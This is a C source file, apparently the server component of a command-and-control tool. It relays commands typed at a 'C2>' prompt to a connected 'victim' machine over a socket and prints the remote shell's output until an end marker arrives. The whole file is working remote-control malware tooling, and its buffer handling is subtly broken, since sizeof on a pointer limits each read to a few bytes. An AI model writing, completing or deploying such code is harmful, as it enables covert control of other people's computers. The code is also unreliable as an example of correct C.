#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include "c2.h"
#include "server/server_psh.h"

void psh_send(char* buf, sock_t client_fd) {
    while (1) {
        printf("\nC2> ");
        fflush(stdout);
        if (!fgets(buf, sizeof(buf), stdin)) break;
        buf[strcspn(buf, "\n")] = 0;
        if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) break;

        send(client_fd, buf, strlen(buf), 0);
        send(client_fd, "\n", 1, 0);
        
        while (1) {
            // Receive up to buffer-1 bytes.
            int n = recv(client_fd, buf, sizeof(buf)-1, 0); 
            if (n <= 0) { 
                printf("\n[!] Victim disconnected\n"); 
                break; 
            }
            buf[n] = '\0';

            // Check for EOF marker
            char *eof_pos = strstr(buf, C2_EOF_MARK);
            if (eof_pos) {
                *eof_pos = '\0';
                printf("%s", buf);
                break;
            }
            printf("%s", buf);
        }
    }
    return;
}